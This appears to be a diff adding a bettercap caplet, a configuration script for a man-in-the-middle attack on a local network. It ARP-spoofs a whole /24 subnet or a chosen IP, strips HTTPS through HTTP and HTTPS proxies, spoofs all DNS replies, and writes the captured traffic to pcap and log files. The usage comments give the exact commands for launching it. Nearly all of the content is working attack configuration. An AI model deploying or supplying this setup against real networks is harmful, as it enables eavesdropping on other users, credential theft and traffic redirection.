@@ -1,0 +1,53 @@
+#!/bin/bash
+
+
+
+# USAGE 
+# sudo sysctl -w net.ipv4.ip_forward=1
+# 1-> Target IP 2-> everyone 
+#   #1 sudo bettercap -caplet bettercap_mitm_monitor.cap -eval "set arp.spoof.targets 192.168.1.77"
+#   #2 sudo bettercap -caplet bettercap_mitm_monitor.cap
+
+
+
+# === Network Recon and ARP Spoofing ===
+## Configures network discovery 
+set arp.spoof.fullduplex true
+set arp.spoof.targets 192.168.1.0/24  # Target subnet
+net.probe on
+net.recon on
+
+# asrp to intercept traffic 
+arp.spoof on 
+
+# === HTTPS/HTTP Proxy  ===
+# Enable the HTTP/HTTPS proxy to intercept traffic
+
+set http.proxy.sslstrip true
+set https.proxy.sslstrip true
+set http.proxy.port 8080
+set https.proxy.port 8081
+set http.proxy.verbose true
+set https.proxy.verbose true
+set net.sniff.output /root/bettercap_logs.pcap
+http.proxy on
+https.proxy on
+# Log all captured network traffic
+set net.sniff.output /root/bettercap_logs.pcap
+
+
+# Enable DNS spoofing if needed (optional)
+set dns.spoof.all true
+dns.spoof on
+
+# === log all traffic to a file  ===
+set http.proxy.log.path /tmp/http_traffic.log
+set dns.spoof.log.path /tmp/dns_traffic.log
+set arp.spoof.log.path /tmp/arp_traffic.log
+set net.recon.log.path /tmp/net_traffic.log
+set net.probe.log.path /tmp/probe_traffic.log
+http.proxy.log on
+https.proxy.log on
+events.stream on
+
+
